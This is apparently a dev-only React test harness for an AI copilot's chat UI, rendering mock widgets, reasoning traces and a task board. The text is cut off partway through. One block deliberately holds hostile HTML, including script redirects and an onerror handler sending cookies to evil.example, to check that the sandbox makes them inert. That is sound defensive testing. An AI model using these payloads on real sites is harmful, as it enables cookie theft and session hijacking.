"use client";
import { useEffect, useState } from "react";
import { UIBlocks } from "../../copilot/UIBlock";
import { JsonTree } from "../../copilot/JsonTree";
import { ChatCore } from "../../copilot/ChatCore";
import { MessageBubble } from "../../copilot/parts";
import { Tasks } from "../../copilot/Tasks";
import { validateBlocks, type UIBlock } from "../../../lib/agent/ui-spec";
import type { ChatMessage } from "../../copilot/useAgent";
import type { Job, JobEvent } from "../../copilot/useJobs";

/* Dev-only visual harness for the copilot domain blocks (.blk-) and composer.
   NOT linked from any nav. Renders hardcoded sample payloads only — zero
   tenant data (the one API the composer demo touches is shimmed client-side
   with fake fixtures). Each section reproduces the real chat CSS context
   (.soli-chat > .cp-msg > .gu-blocks) so soli-chat scoped rules apply exactly
   as they do in production, at a wide (780) and narrow (460) column. Every
   payload goes through validateBlocks — the REAL sanitize/normalize path. */

function isoDay(offset: number): string {
  const d = new Date();
  d.setDate(d.getDate() + offset);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
}

function thisMonth(): string {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}`;
}

/* The user's bug case: a week with 2 busy days + 5 empty, today included. */
const calendarWeek: UIBlock = {
  type: "calendar_week",
  href: "/calendar",
  days: [
    { date: isoDay(-2), posts: [] },
    { date: isoDay(-1), posts: [] },
    {
      date: isoDay(0),
      posts: [
        { id: "demo_1", title: "Why agents beat dashboards", time: "09:00", platform: "youtube", status: "published" },
        { id: "demo_2", title: "The 3-second hook rule", time: "18:30", platform: "instagram", status: "scheduled" },
      ],
    },
    { date: isoDay(1), posts: [] },
    {
      date: isoDay(2),
      posts: [{ id: "demo_3", title: "Ship it Friday: render farm tour", time: "12:00", platform: "tiktok", status: "draft" }],
    },
    { date: isoDay(3), posts: [] },
    { date: isoDay(4), posts: [] },
  ],
};

const calendarMonth: UIBlock = {
  type: "calendar_month",
  month: thisMonth(),
  href: "/calendar",
  events: [
    { date: isoDay(0), title: "Why agents beat dashboards", id: "demo_1", status: "published" },
    { date: isoDay(0), title: "The 3-second hook rule", id: "demo_2", status: "scheduled" },
    { date: isoDay(0), title: "Bonus short", id: "demo_9" },
    { date: isoDay(2), title: "Render farm tour", id: "demo_3", status: "draft" },
    { date: isoDay(7), title: "Q&A livestream", kind: "event" },
    { date: isoDay(-5), title: "Renew Pexels key", kind: "reminder" },
  ],
};

const postCard: UIBlock = {
  type: "post_card",
  itemId: "demo_1",
  title: "Why agents beat dashboards — the 40s version",
  status: "published",
  durationSec: 42,
  mood: "cinematic",
  channel: "labrinox",
  publishedTo: ["youtube", "instagram"],
  metrics: { views: 12400, likes: 980, comments: 56 },
  href: "/post/demo_1",
};

const scorecard: UIBlock = {
  type: "scorecard",
  title: "Hook audit — last 10 posts",
  href: "/insights",
  rows: [
    { label: "Cold open", verdict: "strong", note: "retention +18% vs channel mean" },
    { label: "Question hook", verdict: "variable", note: "works on IG, flat on TT" },
    { label: "Stat drop", verdict: "weak", note: "3s skip rate doubled" },
  ],
};

const insightsChart: UIBlock = {
  type: "insights_chart",
  title: "Views by platform (7d)",
  unit: "views",
  href: "/insights",
  series: [
    { label: "YouTube", value: 18200, delta: 12 },
    { label: "Instagram", value: 9400, delta: -4 },
    { label: "TikTok", value: 21800, delta: 31 },
    { label: "X", value: 1200 },
  ],
};

const timeline: UIBlock = {
  type: "timeline",
  href: "/post/demo_1",
  events: [
    { at: "09:01", title: "Idea accepted", detail: "from mission tick (algo-plan)" },
    { at: "09:04", title: "Script + storyboard", detail: "6 scenes, cinematic mood" },
    { at: "09:12", title: "Rendered", detail: "1080x1920 · 42s · M4 fleet" },
    { at: "09:30", title: "Published to YouTube", kind: "publish" },
  ],
};

const annotate: UIBlock = {
  type: "annotate",
  text: "Retention on the cinematic mood is up 23% this week, the strongest mood since launch.",
  emphasis: [
    { phrase: "23%", style: "circle" },
    { phrase: "strongest mood", style: "underline" },
  ],
  note: "7-day rolling vs channel mean",
};

const board: UIBlock = {
  type: "board",
  title: "This week",
  columns: 2,
  blocks: [scorecard, insightsChart],
};

/* ---- html block: custom sandboxed visualizations (SafeHtml) ---- */

/* A legitimate Soli-authored mini-dashboard: inline styles + inline SVG,
   inheriting the injected house tokens (--bone/--accent/--font-mono). */
const htmlDashboard: UIBlock = {
  type: "html",
  caption: "custom KPI tiles (inline HTML/CSS + SVG)",
  height: 220,
  html: `
<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
  <div style="border:1px solid var(--line);border-radius:10px;padding:12px;">
    <div style="font:600 22px var(--font-mono);color:var(--accent);">48.2k</div>
    <div style="color:var(--muted);font-size:11px;letter-spacing:.04em;text-transform:uppercase;">views · 7d</div>
  </div>
  <div style="border:1px solid var(--line);border-radius:10px;padding:12px;">
    <div style="font:600 22px var(--font-mono);">68<span style="font-size:13px;color:var(--muted);">/100</span></div>
    <div style="color:var(--muted);font-size:11px;letter-spacing:.04em;text-transform:uppercase;">retention</div>
  </div>
  <div style="grid-column:1/3;border:1px solid var(--line);border-radius:10px;padding:12px;">
    <svg viewBox="0 0 200 40" width="100%" height="40" preserveAspectRatio="none">
      <polyline fill="none" stroke="var(--accent)" stroke-width="2"
        points="0,34 25,28 50,30 75,18 100,22 125,12 150,15 175,6 200,8"/>
    </svg>
    <div style="color:var(--muted);font-size:10px;margin-top:4px;">views trend · 14d</div>
  </div>
</div>`,
};

/* ADVERSARIAL: every payload here is HOSTILE. The sandbox="" iframe renders
   ALL of it inert — no script runs, no form posts offsite, no nested frame
   loads, no same-origin access. We render it to prove the page does not break
   and nothing executes. (Confirmed by construction: sandbox="" disallows
   scripts and forces a unique opaque origin; see SafeHtml.tsx.) */
const htmlAdversarial: UIBlock = {
  type: "html",
  caption: "ADVERSARIAL — script/onerror/iframe/form all neutralized by sandbox=\"\"",
  height: 160,
  html: `
<div style="color:var(--bone);font:12px var(--font-mono);">
  <p>Visible text renders; the hostile bits below are inert.</p>
  <script>window.top.location='https://evil.example/'; document.title='pwned';</script>
  <img src="x" onerror="fetch('https://evil.example/steal?c='+document.cookie)">
  <iframe src="https://evil.example/" width="200" height="60"></iframe>
  <form action="https://evil.example/collect" method="post">
    <input name="secret" value="exfil">
    <button type="submit">submit offsite</button>
  </form>
  <a href="javascript:alert(1)">javascript: link</a>
  <svg><script>alert('svg-script')</script></svg>
</div>`,
};

/* ---- widget blocks (v3) ---- */

const widgets: { name: string; block: UIBlock }[] = [
  {
    name: "sparkline",
    block: { type: "sparkline", title: "views · 14d", points: [120, 180, 150, 240, 220, 310, 290, 380, 360, 420, 510, 480, 590, 640], startLabel: "May 30", endLabel: "today", unit: "views", href: "/analytics" },
  },
  {
    name: "donut",
    block: { type: "donut", title: "views by platform", slices: [{ label: "TikTok", value: 21800 }, { label: "YouTube", value: 18200 }, { label: "Instagram", value: 9400 }, { label: "X", value: 1200 }], unit: "views", href: "/analytics" },
  },
  { name: "gauge", block: { type: "gauge", label: "retention score", value: 68, target: 75, href: "/analytics" } },
  {
    name: "heatmap",
    block: {
      type: "heatmap",
      title: "engagement by hour",
      xLabels: ["6a", "9a", "12p", "3p", "6p", "9p"],
      yLabels: ["Mon", "Wed", "Fri", "Sun"],
      cells: [
        [0.1, 0.35, 0.5, 0.3, 0.9, 0.7],
        [0.15, 0.3, 0.6, 0.45, 1, 0.8],
        [0.05, 0.2, 0.4, 0.5, 0.85, 0.6],
        [0.3, 0.55, 0.7, 0.6, 0.75, 0.4],
      ],
      href: "/analytics",
    },
  },
  {
    name: "funnel",
    block: { type: "funnel", title: "viewer funnel", stages: [{ label: "views", value: 12400 }, { label: "likes", value: 980 }, { label: "comments", value: 140 }, { label: "follows", value: 62 }], href: "/analytics" },
  },
  { name: "metric", block: { type: "metric", label: "views this week", value: 48200, delta: 23, href: "/analytics" } },
  { name: "verdict", block: { type: "verdict", verdict: "go", title: "Ship the cinematic series", reason: "retention +18% across the last 5 posts" } },
  {
    name: "checklist",
    block: { type: "checklist", title: "launch checklist", items: [{ label: "thumbnail rendered", done: true }, { label: "caption approved", done: true }, { label: "scheduled for Thursday 18:00", done: false }] },
  },
  { name: "quote", block: { type: "quote", text: "Nobody owns their distribution anymore — that's the whole pitch.", by: "hook · demo_1" } },
  {
    name: "badge_row",
    block: { type: "badge_row", title: "formats", badges: [{ label: "talking-head", kind: "accent" }, { label: "b-roll" }, { label: "mograph", kind: "ok" }, { label: "dialogue", kind: "warn" }] },
  },
  { name: "rating", block: { type: "rating", label: "hook strength", value: 3.5 } },
  { name: "countdown", block: { type: "countdown", label: "next scheduled post", at: new Date(Date.now() + 3 * 3600e3 + 24 * 60e3).toISOString() } },
  {
    name: "slots",
    block: { type: "slots", title: "best times", slots: [{ day: "Thu", time: "18:00", score: 0.92 }, { day: "Sun", time: "11:00", score: 0.74 }, { day: "Tue", time: "21:00", score: 0.61 }], href: "/calendar" },
  },
  {
    name: "mission_card",
    block: { type: "mission_card", missionId: "mis_demo", goal: "Grow Labrinox to 10k subs with 3 premium posts a week", status: "active", cadence: "generate=daily · publish=mon/thu", nextRun: "tomorrow 09:00", href: "/missions" },
  },
  { name: "budget_meter", block: { type: "budget_meter", label: "research budget · June", spentUsd: 4.3, capUsd: 5 } },
  {
    name: "gate",
    block: { type: "gate", title: "2 DNA mutations queued for approval", kind: "dna", summary: "A new hook trait and a format tweak from last night's evolve run.", href: "/channels" },
  },
  { name: "device_card", block: { type: "device_card", device: "m4", status: "busy", job: "render · chapter 3/7 · 64%", hw: "Apple M4 · 32GB", href: "/devices" } },
  {
    name: "hook_lab",
    block: { type: "hook_lab", title: "hook variants", hooks: [{ text: "Your dashboard is lying to you.", score: 86 }, { text: "I rendered 100 videos in a weekend.", score: 74 }, { text: "This channel runs itself. Mostly.", score: 58 }] },
  },
  {
    name: "script_lines",
    block: { type: "script_lines", title: "cold open", lines: [{ at: "0:00", text: "Your dashboard is lying to you." }, { at: "0:03", text: "Here's what it hides — and why your best post died at 200 views." }, { at: "0:09", text: "Three signals actually matter." }] },
  },
  {
    name: "ab_test",
    block: { type: "ab_test", metric: "avg view duration", a: { label: "question hook", value: "14.2s" }, b: { label: "stat hook", value: "19.8s" }, winner: "b" },
  },
  {
    name: "trend_tags",
    block: { type: "trend_tags", title: "rising in niche", tags: [{ label: "agentic coding", heat: 0.9 }, { label: "local llms", heat: 0.6 }, { label: "render farms", heat: 0.35 }, { label: "faceless channels", heat: 0.2 }] },
  },
  { name: "voice_track", block: { type: "voice_track", title: "VO · demo_1", durationSec: 42 } },
  {
    name: "palette",
    block: { type: "palette", title: "labrinox palette", colors: [{ hex: "#e8c46b", name: "accent" }, { hex: "#101014", name: "ink" }, { hex: "#f5f2ea", name: "bone" }, { hex: "#5fd97a", name: "go" }] },
  },
  {
    name: "pipeline",
    block: { type: "pipeline", stages: [{ label: "idea", state: "done" }, { label: "script", state: "done" }, { label: "storyboard", state: "done" }, { label: "render", state: "active" }, { label: "publish", state: "pending" }] },
  },
  {
    name: "diff",
    block: { type: "diff", title: "title rewrite", before: "My new video about AI agents", after: "I let an AI run my channel for 7 days" },
  },
];

const widgetBoard: UIBlock = {
  type: "board",
  title: "channel pulse",
  columns: 2,
  blocks: [
    { type: "metric", label: "views this week", value: 48200, delta: 23 },
    { type: "gauge", label: "retention score", value: 68, target: 75 },
    { type: "sparkline", title: "views · 14d", points: [120, 180, 150, 240, 310, 290, 420, 590], unit: "views" },
    { type: "pipeline", stages: [{ label: "idea", state: "done" }, { label: "script", state: "done" }, { label: "render", state: "active" }, { label: "publish", state: "pending" }] },
  ],
};

/* The user's defect-4 case: "show my device list" → a fleet stat_grid + a
   single device_card + a board, to prove the ink frame HUGS its content
   instead of stretching the full chat column with a huge empty right side. */
const deviceStatGrid: UIBlock = {
  type: "stat_grid",
  stats: [
    { label: "online", value: "1" },
    { label: "busy", value: "0" },
    { label: "offline", value: "0" },
  ],
};
const deviceCard: UIBlock = {
  type: "device_card",
  device: "m4",
  status: "online",
  job: "idle",
  hw: "Apple M4 · 32GB",
  href: "/devices",
};
const deviceBoard: UIBlock = {
  type: "board",
  title: "MY DEVICES",
  columns: 2,
  blocks: [deviceCard, { type: "metric", label: "devices online", value: 1 }],
};

const SAMPLES: { name: string; block: UIBlock }[] = [
  { name: "device_card (defect-4: frame must hug, not stretch wide)", block: deviceCard },
  { name: "stat_grid · fleet (sparse — frame/box must hug)", block: deviceStatGrid },
  { name: "board · MY DEVICES (device_card + metric)", block: deviceBoard },
  { name: "calendar_week (2 busy + 5 empty — the bug case)", block: calendarWeek },
  { name: "calendar_month", block: calendarMonth },
  { name: "post_card", block: postCard },
  { name: "scorecard", block: scorecard },
  { name: "insights_chart", block: insightsChart },
  { name: "timeline", block: timeline },
  { name: "annotate", block: annotate },
  { name: "html (custom sandboxed dashboard — inline CSS + SVG)", block: htmlDashboard },
  { name: "html ADVERSARIAL (script/onerror/iframe/form — all inert)", block: htmlAdversarial },
  { name: "board (2 cols)", block: board },
  ...widgets,
  { name: "board of widgets (2 cols)", block: widgetBoard },
];

function Column({ width }: { width: number }) {
  return (
    <div style={{ width, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        {width}px column
      </h2>
      {/* Reproduce the real chat ancestry so .soli-chat .cp-msg rules apply.
          Every payload runs through validateBlocks — the REAL ui_render path
          (sanitize + scale-normalize), so the harness shows what users see. */}
      <div className="soli-chat">
        {SAMPLES.map((s) => (
          <div key={s.name} style={{ marginBottom: 28 }}>
            <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>{s.name}</div>
            <div className="cp-msg assistant">
              <UIBlocks blocks={validateBlocks([s.block])} />
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ---- degenerate-scale payloads: what weak models actually send (percent or
   ten-scales where 0..1 / 0..5 / 0..100 is expected). The validators must
   normalize these into readable gradients instead of maxed-out blocks. */
const DEGENERATE: { name: string; block: unknown }[] = [
  {
    name: "heatmap with 0-100 cells (must render as a gradient, not all-solid)",
    block: { type: "heatmap", title: "engagement by hour (percent payload)", xLabels: ["6a", "9a", "12p", "3p", "6p", "9p"], yLabels: ["Mon", "Wed", "Fri"], cells: [[10, 35, 50, 30, 90, 70], [15, 30, 60, 45, 100, 80], [5, 20, 40, 50, 85, 60]] },
  },
  {
    name: "slots with 0-100 scores (bars must differ, best still ringed)",
    block: { type: "slots", title: "best times (percent payload)", slots: [{ day: "Thu", time: "18:00", score: 92 }, { day: "Sun", time: "11:00", score: 74 }, { day: "Tue", time: "21:00", score: 61 }] },
  },
  { name: "rating 86 of 100 (must show ~4.5 stars, not 5/5)", block: { type: "rating", label: "hook strength (percent payload)", value: 86 } },
  { name: "gauge 0.68 as a fraction (must show 68, not an empty dial)", block: { type: "gauge", label: "retention (fraction payload)", value: 0.68, target: 0.75 } },
  {
    name: "trend_tags heat 0-100 (gradient, hottest sparks)",
    block: { type: "trend_tags", title: "rising (percent payload)", tags: [{ label: "agentic coding", heat: 90 }, { label: "local llms", heat: 60 }, { label: "render farms", heat: 35 }] },
  },
  {
    name: "voice_track bars 0-100 (waveform, not a solid block)",
    block: { type: "voice_track", title: "VO (percent payload)", durationSec: 18, bars: [20, 55, 80, 40, 95, 60, 30, 75, 50, 85, 45, 65, 25, 70, 90, 35] },
  },
];

function DegenerateColumn() {
  return (
    <div style={{ width: 780, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        degenerate scales (validator normalization)
      </h2>
      <div className="soli-chat">
        {DEGENERATE.map((s) => (
          <div key={s.name} style={{ marginBottom: 28 }}>
            <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>{s.name}</div>
            <div className="cp-msg assistant">
              <UIBlocks blocks={validateBlocks([s.block])} />
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ---- composer demo: the REAL ChatCore over stub handlers, with the one API
   it touches (context options) shimmed to fixtures — so chips, the unified
   field, popovers and keyboard flows can be verified without tenant data. */
const DEMO_MESSAGES: ChatMessage[] = [
  { id: "u1", role: "user", content: "@post:demo_1 how did this one do?" },
  {
    id: "a1",
    role: "assistant",
    content: "Strong week: views are up 23% and the cinematic hook is carrying it.",
  },
];

/* streaming variant: an empty assistant turn → the hand-sketched thinking
   state shows, and the composer renders the spinning-ring stop button */
const DEMO_STREAMING: ChatMessage[] = [
  { id: "u1", role: "user", content: "@post:demo_1 how did this one do?" },
  { id: "a1", role: "assistant", content: "" },
];

function ComposerDemo({ width, streaming = false }: { width: number; streaming?: boolean }) {
  const [ready, setReady] = useState(false);
  useEffect(() => {
    const orig = window.fetch.bind(window);
    window.fetch = ((input: RequestInfo | URL, init?: RequestInit) => {
      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
      if (url.includes("/api/agent/context-options")) {
        return Promise.resolve(
          new Response(
            JSON.stringify({
              items: [
                { id: "demo_1", topic: "Why agents beat dashboards", status: "published" },
                { id: "demo_2", topic: "The 3-second hook rule", status: "scheduled" },
                { id: "demo_3", topic: "Render farm tour", status: "draft" },
              ],
              channels: [
                { id: "labrinox", name: "Labrinox" },
                { id: "code-labrinox", name: "Code Labrinox" },
              ],
            }),
            { status: 200, headers: { "Content-Type": "application/json" } },
          ),
        );
      }
      return orig(input, init);
    }) as typeof window.fetch;
    setReady(true);
    return () => {
      window.fetch = orig;
    };
  }, []);
  if (!ready) return null;
  return (
    <div style={{ width, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        composer · {width}px {streaming ? "(streaming: sketch loader + stop ring)" : "(click + to pick context → chips)"}
      </h2>
      <div className="soli-chat" style={{ display: "flex", flexDirection: "column", height: 360, border: "1px dashed #2a2a2a", borderRadius: 12, padding: "0 10px" }}>
        <ChatCore
          messages={streaming ? DEMO_STREAMING : DEMO_MESSAGES}
          status={streaming ? "streaming" : "idle"}
          send={() => {}}
          stop={() => {}}
          canAct
          role="owner"
          examples={[]}
          active
        />
      </div>
    </div>
  );
}

/* ---- reasoning trace: a settled turn (reasoning + 2 tool chips → the
   collapsible "Thought for Ns" trace above the answer) and a live streaming
   turn (empty content → the "Thinking…" head with the sketched loader). */
const REASONING_TEXT =
  "The user wants to know how the channel is doing this week. I should not answer from memory. " +
  "First I'll pull the recent posts and their statuses with the list tool. " +
  "Then I'll fetch the analytics so I can compare views against last week. " +
  "Views are up across YouTube and TikTok but Instagram dipped, so the cinematic hooks are likely carrying it. " +
  "I'll compose a board with the week strip and the insights chart, then end on a clear verdict.";

const reasoningSettled: ChatMessage = {
  id: "rt1",
  role: "assistant",
  content: "Strong week overall. Views are up 23% and the cinematic hooks are carrying it, though Instagram dipped.",
  reasoning: REASONING_TEXT,
  reasoningMs: 4200,
  tools: [
    { id: "t1", name: "content_list", args: { channel: "labrinox" }, ok: true, status: "done", result: { ok: true, data: { count: 12 } } },
    { id: "t2", name: "analytics_summary", args: { window: "7d" }, ok: true, status: "done", result: { ok: true, data: { views: 48200, delta: 23 } } },
  ],
};

const reasoningStreaming: ChatMessage = {
  id: "rt2",
  role: "assistant",
  content: "",
  reasoning: "Let me check the calendar for next week and see what is scheduled, then surface any gaps.",
};

/* ---- execution timeline: an ORDERED steps[] turn (reason → tool runs_list
   with a result → reason → tool analytics_scorecard with a result) rendered in
   BOTH the live streaming state (expanded ExecutionTimeline, rich results
   inline) and the settled/done state (collapsed ReasoningTrace). */
const execSteps: ChatMessage["steps"] = [
  {
    kind: "reason",
    text: "The user asked how the channel is doing. I should not answer from memory. First I'll pull the recent posts and their statuses with the list tool.",
  },
  {
    kind: "tool",
    id: "x1",
    name: "runs_list",
    args: { channel: "labrinox", limit: 5 },
    ok: true,
    status: "done",
    result: {
      ok: true,
      data: {
        items: [
          { id: "demo_1", title: "Why agents beat dashboards", status: "published", pct: 100, updatedAt: "2026-06-12T09:30:00Z" },
          { id: "demo_2", title: "The 3-second hook rule", status: "scheduled", updatedAt: "2026-06-12T18:30:00Z" },
          { id: "demo_3", title: "Render farm tour", status: "rendering", pct: 64, updatedAt: "2026-06-13T08:10:00Z" },
        ],
      },
    },
  },
  {
    kind: "reason",
    text: "Good, three recent items. Now I'll score the hooks so I can tell which are carrying the week.",
  },
  {
    kind: "tool",
    id: "x2",
    name: "analytics_scorecard",
    args: { window: "7d" },
    ok: true,
    status: "done",
    result: {
      ok: true,
      data: {
        rows: [
          { label: "Cold open", verdict: "strong", note: "retention +18% vs channel mean" },
          { label: "Question hook", verdict: "variable", note: "works on IG, flat on TT" },
          { label: "Stat drop", verdict: "weak", note: "3s skip rate doubled" },
        ],
      },
    },
  },
];

const execStreaming: ChatMessage = {
  id: "ex1",
  role: "assistant",
  content: "",
  reasoning: execSteps!.filter((s) => s.kind === "reason").map((s) => (s as { text: string }).text).join(" "),
  reasoningMs: 5200,
  tools: [
    { id: "x1", name: "runs_list", args: { channel: "labrinox" }, ok: true, status: "done", result: (execSteps![1] as { result: unknown }).result },
    { id: "x2", name: "analytics_scorecard", args: { window: "7d" }, ok: true, status: "done", result: (execSteps![3] as { result: unknown }).result },
  ],
  steps: execSteps,
};

/* same turn, but with one tool still in flight, to show the live spinner +
   pending result state at the bottom of a growing rail */
const execStreamingLive: ChatMessage = {
  ...execStreaming,
  id: "ex2",
  steps: [
    ...execSteps!.slice(0, 3),
    { kind: "tool", id: "x3", name: "analytics_scorecard", args: { window: "7d" }, status: "running" },
  ],
};

const execDone: ChatMessage = {
  ...execStreaming,
  id: "ex3",
  content: "Strong week. Three posts shipped, and the cold-open hook is carrying retention (+18%). The stat-drop hook is the weak spot.",
};

function ExecutionColumn() {
  return (
    <div style={{ width: 780, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        execution timeline (live: expanded rail + rich results · done: collapsed trace)
      </h2>
      <div className="soli-chat">
        <div style={{ marginBottom: 28 }}>
          <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>
            STREAMING — live ordered rail: reason → runs_list (table) → reason → analytics_scorecard (scorecard)
          </div>
          <MessageBubble message={execStreaming} streaming />
        </div>
        <div style={{ marginBottom: 28 }}>
          <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>
            STREAMING — last tool still running (spinner, no result yet)
          </div>
          <MessageBubble message={execStreamingLive} streaming />
        </div>
        <div style={{ marginBottom: 28 }}>
          <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>
            DONE — collapses to &quot;Thought for Ns&quot; trace above the answer (click to expand)
          </div>
          <MessageBubble message={execDone} />
        </div>
      </div>
    </div>
  );
}

function ReasoningColumn() {
  return (
    <div style={{ width: 780, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        reasoning trace (collapsed default + click to expand · streaming = Thinking…)
      </h2>
      <div className="soli-chat">
        <div style={{ marginBottom: 28 }}>
          <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>
            settled turn — &quot;Thought for 4s · 2 steps&quot; (click the row to expand the ink timeline)
          </div>
          <MessageBubble message={reasoningSettled} />
        </div>
        <div style={{ marginBottom: 28 }}>
          <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>
            streaming turn — live &quot;Thinking…&quot; head with the sketched loader
          </div>
          <MessageBubble message={reasoningStreaming} streaming />
        </div>
      </div>
    </div>
  );
}

/* ---- mocked Tasks board: a live pipeline `tool` job (fake log events with a
   parsed pct → thin bar + live rail), a child research job, and a finished
   render — to verify the board polish without running any model/render. ---- */
function ev(partial: Partial<JobEvent>, i: number): JobEvent {
  return { t: Date.now() - (40 - i) * 1000, seq: i, type: "log", ...partial } as JobEvent;
}

const now = Date.now();

const genJob: Job = {
  id: "job_gen",
  kind: "tool",
  title: "generate post: Why agents beat dashboards",
  status: "running",
  rootId: "job_gen",
  depth: 0,
  createdAt: now - 95_000,
  startedAt: now - 95_000,
  events: [
    ev({ message: "started · pipeline_generate_post · tool-generate.log" }, 0),
    ev({ message: "research: sweeping sources" }, 1),
    ev({ message: "script: drafting 6 scenes" }, 2),
    ev({ message: "storyboard A/B: scoring variants" }, 3),
    ev({ message: "voice + music + b-roll resolved" }, 4),
    ev({ message: "rendering 25%", pct: 25 }, 5),
    ev({ message: "rendering 45%", pct: 45 }, 6),
    ev({ message: "rendering 70%", pct: 70 }, 7),
    ev({ type: "tool_call", name: "ffmpeg", id: "c1" }, 8),
    ev({ message: "rendering 88%", pct: 88 }, 9),
  ],
};

const childResearch: Job = {
  id: "job_res",
  kind: "subagent",
  title: "research: hook patterns in niche",
  status: "running",
  parentId: "job_gen",
  rootId: "job_gen",
  depth: 1,
  createdAt: now - 80_000,
  startedAt: now - 80_000,
  events: [
    ev({ type: "spawn", role: "subagent", message: "researcher" }, 0),
    ev({ message: "12 sources fetched" }, 1),
    ev({ message: "cross-verifying claims" }, 2),
  ],
};

const doneRender: Job = {
  id: "job_render",
  kind: "tool",
  title: "render: concept_20260611",
  status: "succeeded",
  rootId: "job_render",
  depth: 0,
  createdAt: now - 600_000,
  startedAt: now - 600_000,
  endedAt: now - 420_000,
  result: "✓ done: concept_20260611  video: data/renders/concept_20260611.mp4",
  events: [
    ev({ message: "rendering 50%", pct: 50 }, 0),
    ev({ message: "rendering 100%", pct: 100 }, 1),
    ev({ message: "✓ done: concept_20260611" }, 2),
    ev({ type: "status", status: "succeeded" }, 3),
  ],
};

const MOCK_JOBS: Job[] = [genJob, childResearch, doneRender];

const MOCK_API = {
  jobs: MOCK_JOBS,
  error: null,
  runningCount: 2,
  enqueue: async () => {},
  cancel: async () => {},
  refresh: async () => {},
} as unknown as Parameters<typeof Tasks>[0]["api"];

function JobsBoardDemo() {
  return (
    <div style={{ width: 460, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        Tasks board (mocked: live pipeline tool job + child + finished render)
      </h2>
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          height: 520,
          border: "1px dashed #2a2a2a",
          borderRadius: 12,
          overflow: "hidden",
        }}
      >
        <Tasks api={MOCK_API} />
      </div>
    </div>
  );
}

/* ---- JsonTree harness: the EXACT screenshot payload the user hated as raw
   JSON, plus the edge cases the component must survive (deep nesting, big
   array, long string, URLs, a circular ref, a primitive/null root). Rendered
   inside the real chat ancestry so the json-tree.css cascade applies exactly
   as in production. */

const screenshotIdeas = {
  ideas: [
    {
      topic: "Why agents beat dashboards",
      angle: "The dashboard is where data goes to die — an agent acts on it",
      format: "talking-head + b-roll",
      rationale: "Frames the product against a familiar pain; high save rate on 'X is dead' hooks.",
      mood: "tech",
    },
    {
      topic: "The 3-second hook rule",
      angle: "You have 3 seconds before the thumb scrolls — here's the math",
      format: "fast-cut montage",
      rationale: "Retention-first content performs on the algorithm's first-view signal.",
      mood: "war_economy",
    },
    {
      topic: "Own your fleet",
      angle: "Nobody owns their distribution anymore — claw it back",
      format: "cinematic monologue",
      rationale: "Build-in-public reputation play; resonates with the indie-hacker audience.",
      mood: "cinematic",
    },
  ],
};

const deepNested = {
  pipeline: {
    stage: "render",
    chapter: { index: 3, of: 7, scene: { id: "sc_12", layers: { bg: { kind: "mograph", seed: 9182 }, text: { lines: ["one", "two"] } } } },
  },
  meta: { workspaceId: "ws_demo", createdBy: "u_demo", flags: { verified: true, premium: false } },
};

const bigArray = {
  runs: Array.from({ length: 240 }, (_, i) => ({
    id: `run_${String(i).padStart(4, "0")}`,
    status: i % 3 === 0 ? "done" : i % 3 === 1 ? "rendering" : "queued",
    pct: (i * 7) % 100,
  })),
};

const longStringAndUrls = {
  report:
    "This verified research run swept 14 sources and cross-checked the claim that short-form retention is dominated by the first-view signal. The cited consensus across creator-economy analyses is that the opening 3 seconds disproportionately determine whether a clip is surfaced again, which compounds across the recommendation graph far more than total watch time alone.",
  primarySource: "https://example.com/research/short-form-retention-2026",
  links: ["https://example.com/a", "https://docs.example.com/algo/ranking-signals?ref=socheli"],
  note: "See primary source above; the link should be clickable inline as well as on its own.",
};

// a primitive root and a null root
const primitiveRoot = 42;
const nullRoot: unknown = null;

// a circular reference — the guard must show [circular] and never recurse
const circular: Record<string, unknown> = { name: "node-a", child: { name: "node-b" } };
(circular.child as Record<string, unknown>).back = circular;

const JSON_CASES: { name: string; data: unknown; depth?: number; max?: number }[] = [
  { name: "THE SCREENSHOT PAYLOAD — { ideas: [ { topic, angle, format, rationale, mood } ] }", data: screenshotIdeas },
  { name: "deeply nested (default 2-level expand, deeper collapsed)", data: deepNested },
  { name: "big array (240 runs → first 100, then +N more)", data: bigArray, max: 100 },
  { name: "long string + inline + whole-value URLs (…more toggle, links)", data: longStringAndUrls },
  { name: "circular ref (guard → [circular])", data: circular },
  { name: "primitive root (42)", data: primitiveRoot },
  { name: "null root", data: nullRoot },
];

function JsonTreeColumn() {
  return (
    <div style={{ width: 780, flexShrink: 0 }}>
      <h2 style={{ font: "600 13px var(--font-mono, monospace)", color: "#888", margin: "0 0 14px" }}>
        JsonTree explorer (replaces raw tool-result JSON)
      </h2>
      <div className="soli-chat">
        {JSON_CASES.map((c) => (
          <div key={c.name} style={{ marginBottom: 28 }}>
            <div style={{ font: "11px var(--font-mono, monospace)", color: "#666", marginBottom: 6 }}>{c.name}</div>
            <div className="cp-msg assistant">
              <JsonTree data={c.data} rootLabel="result" defaultExpandDepth={c.depth ?? 2} maxInitialNodes={c.max ?? 100} />
            </div>
          </div>
        ))}
